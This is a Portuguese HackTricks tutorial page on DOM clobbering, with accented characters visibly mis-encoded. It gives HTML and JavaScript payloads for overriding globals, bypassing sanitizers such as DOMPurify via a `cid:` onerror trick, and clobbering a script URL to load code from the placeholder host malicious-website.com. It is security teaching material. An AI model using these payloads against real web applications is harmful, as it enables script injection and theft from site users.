# Dom Clobbering

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* VocÃª trabalha em uma **empresa de seguranÃ§a cibernÃ©tica**? VocÃª quer ver sua **empresa anunciada no HackTricks**? ou vocÃª quer ter acesso Ã  **Ãºltima versÃ£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A FamÃ­lia PEASS**](https://opensea.io/collection/the-peass-family), nossa coleÃ§Ã£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira [**produtos oficiais PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas tÃ©cnicas de hacking enviando PRs para o** [**repositÃ³rio hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositÃ³rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## **Fundamentos**

Ã‰ possÃ­vel gerar **variÃ¡veis globais dentro do contexto JS** com os atributos **`id`** e **`name`** em tags HTML.
```html
<form id=x></form>
<script> console.log(typeof document.x) //[object HTMLFormElement] </script>
```
Apenas certos elementos podem usar o atributo **name** para clobber globals, eles sÃ£o: `embed`, `form`, `iframe`, `image`, `img` e `object`.

Curiosamente, quando vocÃª usa um **elemento de formulÃ¡rio** para **clobber** uma variÃ¡vel, vocÃª obterÃ¡ o valor **`toString`** do prÃ³prio elemento: `[object HTMLFormElement]`, mas com **Ã¢ncora** o **`toString`** serÃ¡ o **`href`** da Ã¢ncora. Portanto, se vocÃª clobber usando a tag **`a`**, vocÃª pode **controlar** o **valor** quando ele Ã© **tratado como uma string**:
```html
<a href="controlled string" id=x></a>
<script>
console.log(x);//controlled string
</script>
```
### Arrays e Atributos

TambÃ©m Ã© possÃ­vel **sobrescrever um array** e **atributos de objetos**:
```html
<a id=x>
<a id=x name=y href=controlled>
<script>
console.log(x[1])//controlled
console.log(x.y)//controlled
</script>
```
Para sobrescrever **um terceiro atributo** (por exemplo, x.y.z), vocÃª precisa usar um **`formulÃ¡rio`**:
```html
<form id=x name=y><input id=z value=controlled></form>
<form id=x></form>
<script>
alert(x.y.z.value)//controlled
</script>
```
Sobrescrever mais atributos Ã© **mais complicado, mas ainda Ã© possÃ­vel**, usando iframes:
```html
<iframe name=x srcdoc="<a id=y href=controlled></a>"></iframe>
<style>@import 'https://google.com';</style>
<script>alert(x.y)//controlled</script>
```
{% hint style="warning" %}
A tag de estilo Ã© usada para **dar tempo suficiente para o iframe ser renderizado**. Sem ela, vocÃª encontrarÃ¡ um alerta de **indefinido**.
{% endhint %}

Para clobber atributos mais profundos, vocÃª pode usar **iframes com codificaÃ§Ã£o html** desta maneira:
```html
<iframe name=a srcdoc="<iframe srcdoc='<iframe name=c srcdoc=<a/id=d&amp;amp;#x20;name=e&amp;amp;#x20;href=\controlled&amp;amp;gt;<a&amp;amp;#x20;id=d&amp;amp;gt; name=d>' name=b>"></iframe>
<style>@import 'https://google.com';</style>
<script>
alert(a.b.c.d.e)//controlled
</script>
```
### **Burlando Filtros**

Se um filtro estÃ¡ **percorrendo** as **propriedades** de um nÃ³ usando algo como `document.getElementByID('x').attributes`, vocÃª pode **sobrescrever** o atributo **`.attributes`** e **quebrar o filtro**. Outras propriedades do DOM como **`tagName`**, **`nodeName`** ou **`parentNode`** e outras tambÃ©m sÃ£o **sobrescrevÃ­veis**.
```html
<form id=x></form>
<form id=y>
<input name=nodeName>
</form>
<script>
console.log(document.getElementById('x').nodeName)//FORM
console.log(document.getElementById('y').nodeName)//[object HTMLInputElement]
</script>
```
## **Clobbering `window.someObject`**

Um padrÃ£o comum usado por desenvolvedores JavaScript Ã©:
```javascript
var someObject = window.someObject || {};
```
Se vocÃª pode controlar parte do HTML na pÃ¡gina, pode sobrescrever a referÃªncia `someObject` com um nÃ³ DOM, como um link. Considere o seguinte cÃ³digo:
```html
<script>
 window.onload = function(){
    let someObject = window.someObject || {};
    let script = document.createElement('script');
    script.src = someObject.url;
    document.body.appendChild(script);
 };
</script>
```
Para explorar este cÃ³digo vulnerÃ¡vel, vocÃª poderia injetar o seguinte HTML para sobrescrever a referÃªncia `someObject` com um elemento de Ã¢ncora:

{% code overflow="wrap" %}
```html
<a id=someObject><a id=someObject name=url href=//malicious-website.com/malicious.js>
```
{% endcode %}

Injetar os dados **`window.someObject.url`** resultarÃ¡ em `href=//malicious-website.com/malicious.js`.

**Truque**: **`DOMPurify`** permite que vocÃª use o protocolo **`cid:`**, que **nÃ£o codifica em URL as aspas duplas**. Isso significa que vocÃª pode **injetar uma aspa dupla codificada que serÃ¡ decodificada em tempo de execuÃ§Ã£o**. Portanto, injetar algo como **`<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">`** farÃ¡ com que a aspa dupla codificada `&quot;` seja **decodificada em tempo de execuÃ§Ã£o** e **escape** do valor do atributo para **criar** o evento **`onerror`**.

Outra tÃ©cnica comum consiste em usar o elemento **`form`**. Algumas bibliotecas do lado do cliente passarÃ£o pelos atributos do elemento de formulÃ¡rio criado para sanitizÃ¡-lo. Mas, se vocÃª criar um `input` dentro do formulÃ¡rio com `id=attributes`, vocÃª irÃ¡ **sobrescrever a propriedade de atributos** e o sanitizador **nÃ£o** poderÃ¡ passar pelos **atributos reais**.

VocÃª pode [**encontrar um exemplo desse tipo de sobrescrita em um writeup de CTF**](iframes-in-xss-and-csp.md#iframes-in-sop-2).

## Sobrescrevendo o objeto document

De acordo com a documentaÃ§Ã£o, Ã© possÃ­vel sobrescrever atributos do objeto document usando o DOM Clobbering:

> A interface [Document](https://html.spec.whatwg.org/multipage/dom.html#document) [suporta propriedades nomeadas](https://webidl.spec.whatwg.org/#dfn-support-named-properties). Os [nomes de propriedade suportados](https://webidl.spec.whatwg.org/#dfn-supported-property-names) de um objeto [Document](https://html.spec.whatwg.org/multipage/dom.html#document) em qualquer momento consistem no seguinte, em [ordem de Ã¡rvore](https://dom.spec.whatwg.org/#concept-tree-order) de acordo com o elemento que os contribuiu, ignorando duplicatas posteriores, e com valores de atributos [id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute) vindo antes de valores de atributos de nome quando o mesmo elemento contribui ambos:
>
> \- O valor do atributo de conteÃºdo de nome para todos os elementos [expostos](https://html.spec.whatwg.org/multipage/dom.html#exposed) [embed](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-embed-element), [form](https://html.spec.whatwg.org/multipage/forms.html#the-form-element), [iframe](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-iframe-element), [img](https://html.spec.whatwg.org/multipage/embedded-content.html#the-img-element) e [expostos](https://html.spec.whatwg.org/multipage/dom.html#exposed) [object](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-object-element) que tÃªm um atributo de conteÃºdo de nome nÃ£o vazio e estÃ£o [em uma Ã¡rvore de documentos](https://dom.spec.whatwg.org/#in-a-document-tree) com o documento como sua [raiz](https://dom.spec.whatwg.org/#concept-tree-root);\
> \
> \- O valor do atributo de conteÃºdo [id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute) para todos os elementos [expostos](https://html.spec.whatwg.org/multipage/dom.html#exposed) [object](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-object-element) que tÃªm um atributo de conteÃºdo [id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute) nÃ£o vazio e estÃ£o [em uma Ã¡rvore de documentos](https://dom.spec.whatwg.org/#in-a-document-tree) com o documento como sua [raiz](https://dom.spec.whatwg.org/#concept-tree-root);\
> \
> \- O valor do atributo de conteÃºdo [id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute) para todos os elementos [img](https://html.spec.whatwg.org/multipage/embedded-content.html#the-img-element) que tÃªm tanto um atributo de conteÃºdo [id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute) nÃ£o vazio quanto um atributo de conteÃºdo de nome nÃ£o vazio, e estÃ£o [em uma Ã¡rvore de documentos](https://dom.spec.whatwg.org/#in-a-document-tree) com o documento como sua [raiz](https://dom.spec.whatwg.org/#concept-tree-root).

Usando essa tÃ©cnica, vocÃª pode sobrescrever **valores comumente usados, como `document.cookie`, `document.body`, `document.children`**, e atÃ© mesmo mÃ©todos na interface Document, como `document.querySelector`.
```javascript
document.write("<img name=cookie />")

document.cookie
<img name="cookie">

typeof(document.cookie)
'object'

//Something more sanitize friendly than a img tag
document.write("<form name=cookie><input id=toString></form>")

document.cookie
HTMLCollection(2)Â [img, form, cookie: img]

typeof(document.cookie)
'object
```
## Escrevendo apÃ³s o elemento clobbered

VocÃª pode clobber os resultados de uma chamada **`document.getElementById()`** e **`document.querySelector()`** se **vocÃª injetar uma tag `<html>` ou `<body>` com o mesmo atributo id**. Aqui estÃ¡ um exemplo:
```html
<div style=display:none id=cdnDomain class=x>test</div>
<p>
<html id="cdnDomain" class=x>clobbered</html>
<script>
alert(document.getElementById('cdnDomain').innerText);//clobbbered
alert(document.querySelector('.x').innerText);//clobbbered
</script>
```
O que tambÃ©m Ã© interessante Ã© que vocÃª pode **ocultar elementos do `innerText`**, entÃ£o se vocÃª injetar uma tag HTML/body, vocÃª pode usar estilos para ocultÃ¡-la do `innerText` para evitar que outro texto interfira no seu ataque:
```html
<div style=display:none id=cdnDomain>test</div>
<p>existing text</p>
<html id="cdnDomain">clobbered</html>
<style>
p{display:none;}
</style>
<script>
alert(document.getElementById('cdnDomain').innerText);//clobbbered
</script>
```
Analisamos tambÃ©m o SVG e Ã© possÃ­vel usar a tag `<body>` lÃ¡:
```html
<div style=display:none id=cdnDomain>example.com</div>
<svg><body id=cdnDomain>clobbered</body></svg>
<script>
alert(document.getElementById('cdnDomain').innerText)//clobbered
</script>
```
VocÃª precisa de uma tag `<foreignobject>` para usar a tag HTML dentro do SVG no Chrome e no Firefox:
```html
<div style=display:none id=cdnDomain>example.com</div>
<svg>
<foreignobject>
<html id=cdnDomain>clobbered</html>
</foreignobject>
</svg>
<script>
alert(document.getElementById('cdnDomain').innerText)//clobbered
</script>
```
## Clobbering de FormulÃ¡rios

Ã‰ possÃ­vel adicionar **novas entradas dentro de um formulÃ¡rio** apenas especificando o atributo `form` dentro de algumas tags. VocÃª pode usar isso para **adicionar novos valores dentro de um formulÃ¡rio** e atÃ© mesmo adicionar um novo **botÃ£o** para **enviÃ¡-lo** (clickjacking ou abusando de algum cÃ³digo JS `.click()`): 

{% code overflow="wrap" %}
```html
<!--Add a new attribute and a new button to send-->
<textarea form=id-other-form name=info>
";alert(1);//
</textarea>
<button form=id-other-form type="submit" formaction="/edit" formmethod="post">
Click to send!
</button>
```
{% endcode %}

* Para mais atributos de formulÃ¡rio em [**botÃ£o verifique isso**](https://www.w3schools.com/tags/tag\_button.asp)**.**

## ReferÃªncias

* [https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering](https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering)
* Heyes, Gareth. JavaScript para hackers: Aprenda a pensar como um hacker.

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* VocÃª trabalha em uma **empresa de ciberseguranÃ§a**? VocÃª quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso Ã  **Ãºltima versÃ£o do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A FamÃ­lia PEASS**](https://opensea.io/collection/the-peass-family), nossa coleÃ§Ã£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas tÃ©cnicas de hacking enviando PRs para o** [**repositÃ³rio hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositÃ³rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
